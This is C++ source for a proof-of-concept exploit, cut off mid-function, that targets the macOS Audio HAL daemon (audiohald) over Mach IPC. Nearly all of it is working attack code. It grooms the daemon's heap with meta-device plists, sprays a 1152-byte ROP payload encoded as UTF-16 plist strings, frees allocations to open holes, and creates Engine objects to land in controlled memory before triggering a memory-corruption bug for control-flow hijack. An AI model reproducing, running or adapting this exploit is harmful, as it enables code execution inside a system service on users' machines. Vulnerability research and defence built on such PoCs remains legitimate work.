/*
 * CoreAudio Heap Exploitation PoC
 *
 * This exploit targets the macOS audiohald (Audio HAL Daemon) service.
 * It uses Mach IPC to communicate with com.apple.audio.audiohald and
 * exploits a memory corruption vulnerability in the workgroup port
 * fetching functionality.
 *
 * Exploitation strategy:
 *   1. Heap Grooming  - Spray controlled data (ROP payload) via plist allocations
 *   2. Hole Creation  - Free specific allocations to create predictable heap holes
 *   3. Object Reuse   - Create vulnerable Engine objects that land in controlled memory
 *   4. Trigger        - Invoke the vulnerable code path to hijack control flow
 */

/*
 * =============================================================================
 * HEADER IMPORTS - Function origins documented below
 * =============================================================================
 */

/*
 * CoreFoundation/CoreFoundation.h - Apple's core C framework for macOS/iOS
 * Provides:
 *   - CFArrayCreateMutable()      : Create mutable CFArray
 *   - CFArrayAppendValue()        : Append value to CFArray
 *   - CFStringCreateWithBytes()   : Create CFString from raw bytes
 *   - CFStringCreateWithCString() : Create CFString from C string
 *   - CFDictionaryCreateMutable() : Create mutable CFDictionary
 *   - CFDictionarySetValue()      : Set key-value in dictionary
 *   - CFPropertyListCreateData()  : Serialize plist to binary data
 *   - CFDataGetLength()           : Get length of CFData
 *   - CFDataGetBytePtr()          : Get raw pointer to CFData bytes
 *   - CFRelease()                 : Release CF object (decrement refcount)
 *   - CFShow()                    : Debug print CF object
 *   - kCFTypeArrayCallBacks       : Default callbacks for CFArray
 *   - kCFTypeDictionaryKeyCallBacks/ValueCallBacks : Default dict callbacks
 *   - kCFStringEncodingUTF8/UTF16LE : String encoding constants
 *   - kCFPropertyListBinaryFormat_v1_0 : Binary plist format
 */
#include <CoreFoundation/CoreFoundation.h>

/*
 * mach/mach.h - Mach kernel interface (master header)
 * Provides:
 *   - mach_msg()                  : Send/receive Mach IPC messages
 *   - mach_port_allocate()        : Allocate a new Mach port
 *   - mach_port_insert_right()    : Add send/receive rights to port
 *   - mach_port_deallocate()      : Release a port right
 *   - mach_task_self()            : Get port for current task
 *   - task_get_bootstrap_port()   : Get bootstrap port for service lookup
 *   - mach_error_string()         : Convert kern_return_t to string
 *   - MACH_PORT_NULL              : Null port constant
 *   - MACH_PORT_RIGHT_RECEIVE     : Receive right type
 *   - MACH_MSG_TYPE_COPY_SEND     : Copy send right on message send
 *   - MACH_MSG_TYPE_MAKE_SEND     : Create send right
 *   - MACH_MSG_TYPE_MOVE_SEND     : Transfer send right
 *   - MACH_SEND_MSG/MACH_RCV_MSG  : Message send/receive flags
 *   - MACH_SEND_TIMEOUT/MACH_RCV_TIMEOUT : Timeout flags
 *   - KERN_SUCCESS                : Success return code
 *   - mach_msg_header_t           : Message header structure
 *   - mach_msg_ool_descriptor_t   : Out-of-line memory descriptor
 *   - mach_msg_port_descriptor_t  : Port descriptor in message
 *   - MACH_MSGH_BITS_SET()        : Macro to set message header bits
 *   - MACH_MSGH_BITS_COMPLEX      : Flag for complex message (has descriptors)
 */
#include <mach/mach.h>

/*
 * stdio.h - Standard I/O
 * Provides:
 *   - printf()    : Formatted output to stdout
 *   - fprintf()   : Formatted output to file stream
 *   - stderr      : Standard error stream
 *   - setvbuf()   : Set stream buffering mode
 */
#include <stdio.h>

/*
 * stdlib.h - Standard library
 * Provides:
 *   - malloc()           : Allocate heap memory
 *   - free()             : Free heap memory
 *   - exit()             : Terminate process
 *   - strtoul()          : String to unsigned long conversion
 *   - arc4random_uniform() : Cryptographically secure random number (macOS)
 */
#include <stdlib.h>

/*
 * unistd.h - POSIX operating system API
 * Provides:
 *   - sleep()    : Sleep for seconds
 *   - usleep()   : Sleep for microseconds
 */
#include <unistd.h>

/*
 * launch.h - launchd interface (macOS)
 * Provides:
 *   - (included for completeness, not directly used here)
 */
#include <launch.h>

/*
 * string.h - String operations
 * Provides:
 *   - memset()   : Fill memory with byte value
 *   - memcpy()   : Copy memory
 *   - strcmp()   : Compare strings
 *   - strlen()   : Get string length
 *   - strdup()   : Duplicate string (allocates memory)
 */
#include <string.h>

/*
 * servers/bootstrap.h - Bootstrap server interface
 * Provides:
 *   - bootstrap_look_up() : Look up a Mach service by name
 *                          Returns a send right to the service port
 */
#include <servers/bootstrap.h>

/*
 * mach/vm_map.h - Virtual memory operations
 * Provides:
 *   - vm_allocate()   : Allocate virtual memory in a task
 *   - VM_FLAGS_ANYWHERE : Let kernel choose address
 */
#include <mach/vm_map.h>

/*
 * C++ Standard Library Headers
 */
#include <iostream>   // std::cout, std::cerr, std::endl
#include <sstream>    // std::ostringstream - string stream for building strings
#include <fstream>    // std::ifstream - file input stream
#include <cstring>    // C++ wrapper for string.h (std::memcpy, etc.)
#include <thread>     // std::thread (not used but included)
#include <vector>     // std::vector - dynamic array container
#include <mutex>      // std::mutex (not used but included)

// ANSI color codes for terminal output formatting
#define RESET   "\033[0m"
#define BOLD    "\033[1m"
#define RED     "\033[31m"
#define GREEN   "\033[32m"
#define YELLOW  "\033[33m"
#define BLUE    "\033[34m"
#define MAGENTA "\033[35m"
#define CYAN    "\033[36m"

// Starting point for object ID search (high value to avoid collisions)
#define HIGH_OBJECT_ID_THAT_IS_NOT_USED_YET 12000

// Mach message sizes for various CoreAudio IPC operations
#define XSYSTEM_OPEN_MSG_SIZE 0x38                        // Client initialization
#define XIOCONTEXT_FETCH_WORKGROUP_PORT_MSG_SIZE 0x24     // Vulnerability trigger
#define XSYSTEM_GET_OBJECT_INFO_SIZE 0x24                 // Object type query
#define XSYSTEM_CREATE_META_DEVICE_SIZE 0x38              // Meta device creation

// Target Mach service - the Audio HAL Daemon
const char *service_name = "com.apple.audio.audiohald";

// Heap spray configuration (set via command line)
uint32_t num_iterations = 0;        // Number of spray iterations
uint32_t allocs_per_iteration = 0;  // Allocations per iteration

// Object ID tracking for enumeration
uint32_t previous_next_object_id = 0;

// Mach ports for IPC communication
mach_port_t bootstrap_port = MACH_PORT_NULL;  // Bootstrap service port
mach_port_t service_port = MACH_PORT_NULL;    // audiohald service port

// Track created devices for later freeing (hole creation)
std::vector<uint32_t> created_devices = {};
uint32_t engine_object_id = 0;

/*
 * Mach Message Structures
 *
 * These structures define the IPC message formats for communicating with
 * audiohald. Each corresponds to a specific CoreAudio HAL operation.
 * The msgh_id field in the header identifies which handler processes the message.
 */

// Message ID 1010059: XIOContext_FetchWorkgroupPort
// This is the VULNERABLE message handler - triggers the memory corruption
typedef struct {
    mach_msg_header_t header;
    char body0[8];
    uint32_t object_id;  // Target object ID (Engine object for exploitation)
} xiocontext_fetch_workgroup_port_mach_message;

// Message ID 1010005: XSystem_CreateMetaDevice
// Creates aggregate/meta audio devices - used for heap grooming
typedef struct {
    mach_msg_header_t header;
    mach_msg_size_t msgh_descriptor_count;
    mach_msg_ool_descriptor_t descriptor[1];  // OOL plist data
    char body0[8];
    uint32_t plist_length;
} xsystem_createmetadevice_mach_message;

// Message ID 1010042: XObject_GetPropertyData with plist (selector 'mktp')
// Used to create Engine/Tap objects for exploitation
typedef struct {
    mach_msg_header_t header;
    mach_msg_size_t msgh_descriptor_count;
    mach_msg_ool_descriptor_t descriptor[1];  // OOL plist data
    char body0[8];
    uint32_t object_id;
    uint32_t mSelector;   // AudioObjectPropertySelector (e.g., 'mktp' = make tap)
    uint32_t mScope;      // AudioObjectPropertyScope (e.g., 'glob' = global)
    uint32_t mElement;    // AudioObjectPropertyElement
    uint32_t plist_length;
} xobject_getpropertydata_dcfstring_qplist_mach_message;

// Message ID 1010034: XObject_SetPropertyData with plist
// Used for heap spray (selector 'acom') and freeing allocations
typedef struct {
    mach_msg_header_t header;
    mach_msg_size_t msgh_descriptor_count;
    mach_msg_ool_descriptor_t descriptor[1];  // OOL plist data (contains ROP payload)
    char body0[8];
    uint32_t object_id;
    uint32_t mSelector;   // 'acom' for allocations
    uint32_t mScope;      // 'glob'
    uint32_t mElement;
    uint32_t plist_length;
} xobject_setpropertydata_dplist_mach_message;

// Message ID 1010002: XSystem_GetObjectInfo
// Queries object type - used for enumeration and verification
typedef struct {
    mach_msg_header_t header;
    char body0[8];
    uint32_t object_id;
} xsystem_getobjectinfo_mach_message;

// Message ID 1010000: XSystem_Open
// Client initialization - must be called before other operations
typedef struct {
    mach_msg_header_t header;
    mach_msg_size_t msgh_descriptor_count;
    mach_msg_port_descriptor_t descriptor[1];  // Send right for async notifications
    char body[];
} xsystemopen_mach_message;

/*
 * Creates a Mach port with both send and receive rights.
 * Used for bidirectional IPC communication with audiohald.
 */
mach_port_t create_mach_port_with_send_and_receive_rights() {
    mach_port_t port;
    kern_return_t kr;

    // mach_port_allocate() - <mach/mach.h>
    // mach_task_self() - <mach/mach.h> - returns port representing this process
    kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
    if (kr != KERN_SUCCESS) {
        // fprintf() - <stdio.h>, mach_error_string() - <mach/mach.h>
        fprintf(stderr, RED "‚ùå Failed to allocate port: %s\n" RESET, mach_error_string(kr));
        exit(1);  // exit() - <stdlib.h>
    }

    // mach_port_insert_right() - <mach/mach.h>
    kr = mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
    if (kr != KERN_SUCCESS) {
        fprintf(stderr, RED "‚ùå Failed to insert send right: %s\n" RESET, mach_error_string(kr));
        exit(1);
    }

    return port;
}

/*
 * Generates a random alphanumeric string for unique device identifiers.
 * Each meta device needs a unique UID to be created.
 */
std::string generateRandomString(size_t length = 10) {
    const char charset[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    std::string randomString;
    randomString.reserve(length);

    for (size_t i = 0; i < length; ++i) {
        randomString += charset[arc4random_uniform(sizeof(charset) - 1)];
    }

    return randomString;
}

/*
 * Generates the plist payload for creating a meta (aggregate) audio device.
 * Meta devices are used for heap grooming - each creation allocates memory.
 */
char *generateCreateMetaDevicePlist() {
    std::ostringstream plistStream;
    plistStream << "<?xml version=\"1.0\" encoding=\"UTF-8\"?>"
                    "<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" "
                    "\"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">"
                    "<plist version=\"1.0\"><dict><key>name</key><string>Heap Grooming Device</string><key>stacked</key><true/><key>uid</key>";

    std::string uid = generateRandomString();

    plistStream << "<string>" << uid << "</string>";

    plistStream << "</dict></plist>";

    std::string plistString = plistStream.str();
    std::cout << CYAN "‚öôÔ∏è  Creating Meta Device with uid: " << BOLD << uid << RESET << std::endl;
    return strdup(plistString.c_str());
}

/*
 * Generates the plist payload for creating an Engine/Tap object.
 * Engine objects (type "ngnejboa") contain the vulnerable code path.
 * The 'mktp' (make tap) selector creates these objects.
 */
char *generateCreateEnginePlist() {
    std::ostringstream plistStream;
    plistStream << "<?xml version=\"1.0\" encoding=\"UTF-8\"?>"
                    "<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" "
                    "\"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">"
                    "<plist version=\"1.0\"><dict><key>TapUUID</key><string>ExploitTap</string><key>IsMixdown</key><true/></dict></plist>";

    std::string plistString = plistStream.str();
    return strdup(plistString.c_str());
}

/*
 * Queries audiohald for the type of an object given its ID.
 * Returns an 8-byte type string (e.g., "ngnejboa" for Engine, "ggaaveda" for MetaDevice).
 * Used to enumerate objects and verify successful creation.
 * Sends message ID 1010002 (XSystem_GetObjectInfo).
 */
char * getObjectType(uint32_t object_id) {
    mach_msg_return_t result;
    xsystem_getobjectinfo_mach_message *msg = (xsystem_getobjectinfo_mach_message *)malloc(XSYSTEM_GET_OBJECT_INFO_SIZE);
    void *reply = malloc(100);
    memset(reply, 0xAA, 100);

    mach_port_t reply_port;
    kern_return_t kr;

    kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &reply_port);
    if (kr != KERN_SUCCESS) {
        fprintf(stderr, RED "‚ùå Error allocating reply port: %s\n" RESET, mach_error_string(kr));
        return NULL;
    }
    
    // MACH_MSGH_BITS_SET() - <mach/mach.h> macro
    // Sets up message header bits: remote disposition, local disposition, voucher, other
    msg->header.msgh_bits = MACH_MSGH_BITS_SET(MACH_MSG_TYPE_COPY_SEND, MACH_MSG_TYPE_MAKE_SEND, MACH_PORT_NULL, MACH_PORT_NULL);
    msg->header.msgh_size = XSYSTEM_GET_OBJECT_INFO_SIZE;
    msg->header.msgh_remote_port = service_port;   // Send to audiohald
    msg->header.msgh_local_port = reply_port;      // Receive reply here
    msg->header.msgh_id = 1010002;                 // XSystem_GetObjectInfo

    msg->object_id = object_id;

    // mach_msg() - <mach/mach.h>
    // The core Mach IPC primitive - sends and/or receives messages
    // MACH_SEND_MSG: send the message
    // MACH_SEND_TIMEOUT: timeout after specified ms if can't send
    result = mach_msg(&msg->header, MACH_SEND_MSG | MACH_SEND_TIMEOUT, XSYSTEM_GET_OBJECT_INFO_SIZE, 0, MACH_PORT_NULL, 1000, MACH_PORT_NULL);
    if (result != MACH_MSG_SUCCESS) {
        free(msg);
        free(reply);
        return NULL;
    }

    // mach_msg() for receiving - MACH_RCV_MSG flag
    // Waits for a reply message on reply_port
    result = mach_msg((mach_msg_header_t *)reply, MACH_RCV_MSG | MACH_RCV_TIMEOUT, 0, 100, reply_port, 1000, MACH_PORT_NULL);
    if (result != MACH_MSG_SUCCESS) {
        free(msg);
        free(reply);
        return NULL;
    }

    // mach_port_deallocate() - <mach/mach.h>
    // Release the port right (decrements reference count)
    mach_port_deallocate(mach_task_self(), reply_port);

    free(msg);
    char *type = (char *)malloc(9);
    memcpy(type, (char *)reply+48, 8);
    type[8] = '\0';
    free(reply);

    return type;
}

/*
 * Finds the next available object ID by scanning backwards from a high ID.
 * Objects in audiohald are tracked by sequential IDs. This function finds
 * the highest currently allocated object (ends with "jboa" suffix) to
 * predict where the next allocation will land.
 */
uint32_t getNextObjectID() {
    if (!previous_next_object_id) previous_next_object_id = HIGH_OBJECT_ID_THAT_IS_NOT_USED_YET;
    for (uint32_t object_id = previous_next_object_id + 50; object_id > 32; object_id--) {
        char *object_type = getObjectType(object_id);

        // Check if this is a valid object (type string ends with "jboa")
        if (object_type && !strcmp("jboa", object_type+4)) {
            printf(GREEN "‚úÖ Found an object at object ID %d of type %s!\n" RESET, object_id, object_type);
            free(object_type);
            previous_next_object_id = object_id + 1;
            return object_id + 1;
        }
        free(object_type);
    }
    return 1;
}

/*
 * Allocates out-of-line (OOL) memory for Mach messages.
 * OOL memory is used to send large payloads (like plists) via Mach IPC.
 * The kernel maps this memory into the target process's address space.
 */
void *allocate_ool_memory(vm_size_t size, const char *data) {
    void *oolBuffer = NULL;
    // vm_allocate() - <mach/vm_map.h>
    // Allocates virtual memory pages in the current task
    // VM_FLAGS_ANYWHERE lets the kernel choose the address
    if (vm_allocate(mach_task_self(), (vm_address_t *)&oolBuffer, size, VM_FLAGS_ANYWHERE) != KERN_SUCCESS) {
        printf(RED "‚ùå Failed to allocate memory buffer\n" RESET);
        return NULL;
    }

    memcpy(oolBuffer, data, size);

    return oolBuffer;
}

/*
 * Creates Engine/Tap objects that contain the vulnerable code path.
 * These are the objects that will be targeted when triggering the vulnerability.
 * Uses message ID 1010042 with selector 'mktp' (make tap).
 *
 * After heap grooming and freeing, these objects may land in controlled memory,
 * allowing the ROP payload to be executed when the bug is triggered.
 */
uint32_t createEngineObjects(uint32_t num_engine_objects) {
    for (uint32_t i = 0; i < num_engine_objects; i++) {
        uint32_t next_object_id = getNextObjectID() + 1;

        if (next_object_id == 1) {
            printf(RED "‚ùå Error: Couldn't find the next Object ID...\n" RESET);
            exit(1);
        }
        
        xobject_getpropertydata_dcfstring_qplist_mach_message *msg = new xobject_getpropertydata_dcfstring_qplist_mach_message;
        kern_return_t result;

        msg->msgh_descriptor_count = 1;
        char *data = generateCreateEnginePlist();
        msg->descriptor[0].address = allocate_ool_memory(strlen(data) + 1, data);
        msg->descriptor[0].size = strlen(data) + 1;
        msg->descriptor[0].deallocate = 0;
        msg->descriptor[0].type = 1;
        msg->descriptor[0].copy = 1;
        
        msg->header.msgh_bits = MACH_MSGH_BITS_SET(MACH_MSG_TYPE_COPY_SEND, MACH_MSG_TYPE_MOVE_SEND, MACH_PORT_NULL, MACH_MSGH_BITS_COMPLEX);
        msg->header.msgh_size = sizeof(xobject_getpropertydata_dcfstring_qplist_mach_message);
        msg->header.msgh_remote_port = service_port;
        msg->header.msgh_local_port = MACH_PORT_NULL;
        msg->header.msgh_voucher_port = MACH_PORT_NULL;
        msg->header.msgh_id = 1010042;

        msg->plist_length = strlen(data) + 1;
        msg->object_id = 1;
        msg->mSelector = 'mktp';
        msg->mScope = 'glob';
        msg->mElement = 0;

        result = mach_msg(&msg->header, MACH_SEND_MSG | MACH_SEND_TIMEOUT, sizeof(xobject_getpropertydata_dcfstring_qplist_mach_message), 0, MACH_PORT_NULL, 5000, MACH_PORT_NULL);
        if (result != MACH_MSG_SUCCESS) {
            printf(RED "‚ùå Mach message send failed for CreateMetaDevice %d\n" RESET, result);
            free(msg);
            return 1;
        }

        printf(YELLOW "üîé Checking for successful creation of the Engine Device...\n" RESET);

        char *object_type = getObjectType(next_object_id);
        printf("Object type is: " BOLD "%s" RESET ", ", object_type);
        if (!strcmp(object_type, "ngnejboa")) {
            printf(GREEN "which looks good! ‚úÖ\n" RESET);
        } else {
            printf(RED "which doesn't check out... ‚ùå\n" RESET);
        }

        engine_object_id = next_object_id;
        delete msg;
        free(data);
    }
    return 0;
}

/*
 * Creates a meta (aggregate) audio device for heap grooming.
 * Each meta device allocates memory in audiohald's heap.
 * By creating many of these, we fill the heap with known allocations.
 * Uses message ID 1010005 (XSystem_CreateMetaDevice).
 *
 * Returns the object ID of the created device (tracked for later freeing).
 */
uint32_t createMetaDevice() {
    uint32_t next_object_id = getNextObjectID();
    if (next_object_id == 1) {
        printf(RED "‚ùå Error: Couldn't find the next Object ID...\n" RESET);
        exit(1);
    }

    xsystem_createmetadevice_mach_message *msg = new xsystem_createmetadevice_mach_message;
    kern_return_t result;

    msg->msgh_descriptor_count = 1;
    char *data = generateCreateMetaDevicePlist();
    msg->descriptor[0].address = allocate_ool_memory(strlen(data) + 1, data);
    msg->descriptor[0].size = strlen(data) + 1;
    msg->descriptor[0].deallocate = 0;
    msg->descriptor[0].type = 1;
    msg->descriptor[0].copy = 1;
    
    msg->header.msgh_bits = MACH_MSGH_BITS_SET(MACH_MSG_TYPE_COPY_SEND, MACH_MSG_TYPE_MOVE_SEND, MACH_PORT_NULL, MACH_MSGH_BITS_COMPLEX);
    msg->header.msgh_size = sizeof(xsystem_createmetadevice_mach_message);
    msg->header.msgh_remote_port = service_port;
    msg->header.msgh_local_port = MACH_PORT_NULL;
    msg->header.msgh_voucher_port = MACH_PORT_NULL;
    msg->header.msgh_id = 1010005;

    msg->plist_length = strlen(data) + 1;

    result = mach_msg(&msg->header, MACH_SEND_MSG | MACH_SEND_TIMEOUT, sizeof(xsystem_createmetadevice_mach_message), 0, MACH_PORT_NULL, 5000, MACH_PORT_NULL);
    if (result != MACH_MSG_SUCCESS) {
        printf(RED "‚ùå Mach message send failed for CreateMetaDevice %d\n" RESET, result);
        free(msg);
        return 1;
    }

    printf(YELLOW "üîé Checking for successful creation of the Meta Device...\n" RESET);

    char *object_type = getObjectType(next_object_id);
    printf("Object type is: " BOLD "%s" RESET ", ", object_type);
    if (!strcmp(object_type, "ggaaveda")) {
        printf(GREEN "which looks good! ‚úÖ\n" RESET);
        created_devices.push_back(next_object_id);
    } else {
        printf(RED "which doesn't check out... ‚ùå\n" RESET);
        previous_next_object_id += 200;
    }

    delete msg;
    free(data);

    return next_object_id;
}

/*
 * Initializes a client session with audiohald.
 * Sends message ID 1010000 (XSystem_Open) to register as a client.
 * Must be called before any other operations can be performed.
 * Passes a send right that audiohald uses for async notifications.
 */
int sendInitializeClientMessage() {
    kern_return_t kr;
    xsystemopen_mach_message *xsystemopen_msg = (xsystemopen_mach_message *)malloc(XSYSTEM_OPEN_MSG_SIZE);
    mach_port_t reply_port;
    mach_port_t send_right_port = create_mach_port_with_send_and_receive_rights();

    xsystemopen_msg->msgh_descriptor_count = 1;
    xsystemopen_msg->descriptor[0].name = send_right_port;
    xsystemopen_msg->descriptor[0].disposition = MACH_MSG_TYPE_MOVE_SEND;
    xsystemopen_msg->descriptor[0].type = MACH_MSG_PORT_DESCRIPTOR;

    xsystemopen_msg->header.msgh_remote_port = service_port;
    xsystemopen_msg->header.msgh_voucher_port = MACH_PORT_NULL;
    xsystemopen_msg->header.msgh_id = 1010000;

    kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &reply_port);
    if (kr != KERN_SUCCESS) {
        fprintf(stderr, RED "‚ùå Error allocating reply port: %s\n" RESET, mach_error_string(kr));
        return kr;
    }

    xsystemopen_msg->header.msgh_local_port = MACH_PORT_NULL;
    xsystemopen_msg->header.msgh_bits = MACH_MSGH_BITS_SET(MACH_MSG_TYPE_COPY_SEND, MACH_MSG_TYPE_MOVE_SEND, MACH_PORT_NULL, MACH_MSGH_BITS_COMPLEX);

    mach_msg_return_t result = mach_msg(&xsystemopen_msg->header, MACH_SEND_MSG | MACH_SEND_TIMEOUT, XSYSTEM_OPEN_MSG_SIZE, 0, send_right_port, 5000, MACH_PORT_NULL);

    free(xsystemopen_msg);

    if (result != KERN_SUCCESS) {
        fprintf(stderr, RED "‚ùå Error sending Mach message: %s\n" RESET, mach_error_string(result));
        return 1;
    }

    mach_port_deallocate(mach_task_self(), send_right_port);

    printf(GREEN "üéâ XSystem_Open stage complete.\n" RESET);
    return 0;
}

// Base64 encoding table
static const char b64_table[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

// Standard base64 encoding (currently unused but available for plist encoding)
std::string base64_encode(const std::string& input) {
    std::string encoded;
    int val = 0, valb = -6;
    for (uint8_t c : input) {
        val = (val << 8) + c;
        valb += 8;
        while (valb >= 0) {
            encoded.push_back(b64_table[(val >> valb) & 0x3F]);
            valb -= 6;
        }
    }
    if (valb > -6) encoded.push_back(b64_table[((val << 8) >> (valb + 8)) & 0x3F]);
    while (encoded.size() % 4) encoded.push_back('=');
    return encoded;
}

/*
 * Generates a binary plist containing the ROP payload for heap spraying.
 *
 * The payload is loaded from "rop_payload.bin" (must be exactly 1152 bytes).
 * The raw bytes are converted to UTF-16LE strings and stored in a CFArray,
 * which is then serialized as a binary plist. This encoding allows arbitrary
 * binary data to survive plist parsing and land in audiohald's heap.
 *
 * The plist contains 'allocs_per_iteration' copies of the payload string,
 * creating multiple allocations per message to speed up heap spraying.
 */
char* generateAllocationPlistBinary(size_t& out_size) {
    const size_t payload_bytes = 1152;  // Required payload size (matches target allocation)

    // Load the ROP payload from disk
    std::ifstream ropFile("rop_payload.bin", std::ios::binary | std::ios::ate);
    if (!ropFile.is_open()) {
        std::cerr << RED << "‚ùå Failed to open rop_payload.bin" << RESET << std::endl;
        return nullptr;
    }

    std::streamsize size = ropFile.tellg();
    if (size != payload_bytes) {
        std::cerr << RED << "‚ùå rop_payload.bin must be exactly 1152 bytes, got " << size << RESET << std::endl;
        return nullptr;
    }

    ropFile.seekg(0, std::ios::beg);
    std::vector<uint8_t> raw_bytes(payload_bytes);
    if (!ropFile.read(reinterpret_cast<char*>(raw_bytes.data()), payload_bytes)) {
        std::cerr << RED << "‚ùå Failed to read from rop_payload.bin" << RESET << std::endl;
        return nullptr;
    }
    ropFile.close();

    // Convert raw bytes to UTF-16LE for embedding in plist strings
    // std::memcpy() - <cstring>
    std::vector<uint16_t> payload_utf16;
    for (size_t i = 0; i < raw_bytes.size(); i += 2) {
        uint16_t val;
        std::memcpy(&val, &raw_bytes[i], 2);
        payload_utf16.push_back(val);
    }

    // CFArrayCreateMutable() - <CoreFoundation/CoreFoundation.h>
    // Creates a mutable array to hold our payload strings
    CFMutableArrayRef cfArray = CFArrayCreateMutable(NULL, 0, &kCFTypeArrayCallBacks);

    // Create multiple copies of the payload string for heap spray
    for (uint32_t i = 0; i < allocs_per_iteration; ++i) {
        std::vector<uint16_t> full_string;
        full_string.insert(full_string.end(), payload_utf16.begin(), payload_utf16.end());

        // CFStringCreateWithBytes() - <CoreFoundation/CoreFoundation.h>
        // Creates a CFString from raw UTF-16LE bytes (our ROP payload)
        CFStringRef strEntry = CFStringCreateWithBytes(NULL, reinterpret_cast<const UInt8*>(full_string.data()), full_string.size() * sizeof(uint16_t), kCFStringEncodingUTF16LE, false);

        if (strEntry) {
            // CFArrayAppendValue() - <CoreFoundation/CoreFoundation.h>
            CFArrayAppendValue(cfArray, strEntry);
            // CFRelease() - <CoreFoundation/CoreFoundation.h> - decrement refcount
            CFRelease(strEntry);
        } else {
            std::cerr << RED << "‚ùå Failed to create CFString at index " << i << RESET << std::endl;
        }
    }

    // CFDictionaryCreateMutable() - <CoreFoundation/CoreFoundation.h>
    // Create dict with key "arr" -> array of payload strings
    CFMutableDictionaryRef dict = CFDictionaryCreateMutable(NULL, 0, &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
    // CFStringCreateWithCString() - <CoreFoundation/CoreFoundation.h>
    CFStringRef key = CFStringCreateWithCString(NULL, "arr", kCFStringEncodingUTF8);
    // CFDictionarySetValue() - <CoreFoundation/CoreFoundation.h>
    CFDictionarySetValue(dict, key, cfArray);
    CFRelease(key);
    CFRelease(cfArray);

    // CFPropertyListCreateData() - <CoreFoundation/CoreFoundation.h>
    // Serialize the dictionary to binary plist format
    // This is the key step: our ROP payload is now in a valid plist that audiohald will parse
    CFErrorRef error = NULL;
    CFDataRef binaryData = CFPropertyListCreateData(NULL, dict, kCFPropertyListBinaryFormat_v1_0, 0, &error);
    CFRelease(dict);

    if (!binaryData) {
        // CFShow() - <CoreFoundation/CoreFoundation.h> - debug print
        if (error) CFShow(error);
        return nullptr;
    }

    // CFDataGetLength() - <CoreFoundation/CoreFoundation.h>
    out_size = CFDataGetLength(binaryData);
    // malloc() - <stdlib.h>
    char* out = static_cast<char*>(malloc(out_size));
    // CFDataGetBytePtr() - <CoreFoundation/CoreFoundation.h> - get raw bytes
    // memcpy() - <string.h>
    memcpy(out, CFDataGetBytePtr(binaryData), out_size);

    CFRelease(binaryData);
    return out;
}

/*
 * Performs heap spray by sending plist payloads to audiohald.
 *
 * Each iteration:
 *   1. Creates a new meta device
 *   2. Sets property data on it with selector 'acom'
 *   3. The plist contains arrays of strings with embedded ROP payload
 *
 * This fills the heap with controlled data at predictable sizes.
 * Uses message ID 1010034 (XObject_SetPropertyData).
 */
int doAllocations(int num_iterations) {
    for (int allocation_count = 0; allocation_count < num_iterations; allocation_count++) {
        printf("üåä Spraying iteration %d/%d (%d allocations via plist)...\n", allocation_count + 1, num_iterations, allocs_per_iteration);
        xobject_setpropertydata_dplist_mach_message *msg = new xobject_setpropertydata_dplist_mach_message;
        msg->msgh_descriptor_count = 1;

        size_t data_size = 0;
        char *data = generateAllocationPlistBinary(data_size);

        msg->descriptor[0].address = allocate_ool_memory(data_size, data);
        msg->descriptor[0].size = data_size;
        msg->descriptor[0].deallocate = 0;
        msg->descriptor[0].type = 1;
        msg->descriptor[0].copy = 1;

        msg->header.msgh_bits = MACH_MSGH_BITS_SET(MACH_MSG_TYPE_COPY_SEND, MACH_MSG_TYPE_MAKE_SEND_ONCE, MACH_PORT_NULL, MACH_MSGH_BITS_COMPLEX);
        msg->header.msgh_size = sizeof(xobject_setpropertydata_dplist_mach_message);
        msg->header.msgh_remote_port = service_port;
        msg->header.msgh_local_port = MACH_PORT_NULL;
        msg->header.msgh_voucher_port = MACH_PORT_NULL;
        msg->header.msgh_id = 1010034;
        
        msg->object_id = createMetaDevice();
        msg->mSelector = 'acom';
        msg->mScope = 'glob';
        msg->mElement = 0;
        msg->plist_length = data_size;

        mach_msg_return_t result = mach_msg(&msg->header, MACH_SEND_MSG | MACH_SEND_TIMEOUT, sizeof(xobject_setpropertydata_dplist_mach_message), 0, MACH_PORT_NULL, 5000, MACH_PORT_NULL);

        delete msg;
        free(data);

        if (result != MACH_MSG_SUCCESS) {
            fprintf(stderr, RED "‚ùå Error sending Mach message: %s\n" RESET, mach_error_string(result));
            return 1;
        }

        printf(GREEN "‚ú® Successfully performed allocations %d\n" RESET, allocation_count + 1);
        usleep(50000);
    }
    return 0;
}

/*
 * Generates a minimal plist to trigger deallocation.
 * Setting 'arr' to a small string causes the previous large allocation to be freed.
 */
char* generateFreePlist() {
    std::ostringstream plistStream;
    plistStream << "<?xml version=\"1.0\" encoding=\"UTF-8\"?>"
                    "<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" "
                    "\"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">"
                    "<plist version=\"1.0\"><dict><key>arr</key><string>FREE</string></dict></plist>";

    std::string plistString = plistStream.str();
    return strdup(plistString.c_str());
}

/*
 * Frees a previously allocated heap region by replacing the large payload
 * with a small string. This creates "holes" in the heap that can be
 * reclaimed by subsequent allocations (like Engine objects).
 *
 * The goal is to have a vulnerable Engine object land in memory that
 * was previously filled with the ROP payload.
 */
int freeAllocation() {
    xobject_setpropertydata_dplist_mach_message *msg = new xobject_setpropertydata_dplist_mach_message;
    msg->msgh_descriptor_count = 1;
    char *data = generateFreePlist();

    msg->descriptor[0].address = allocate_ool_memory(strlen(data) + 1, data);
    msg->descriptor[0].size = strlen(data) + 1;
    msg->descriptor[0].deallocate = 0;
    msg->descriptor[0].type = 1;
    msg->descriptor[0].copy = 1;

    msg->header.msgh_bits = MACH_MSGH_BITS_SET(MACH_MSG_TYPE_COPY_SEND, MACH_MSG_TYPE_MAKE_SEND_ONCE, MACH_PORT_NULL, MACH_MSGH_BITS_COMPLEX);
    msg->header.msgh_size = sizeof(xobject_setpropertydata_dplist_mach_message);
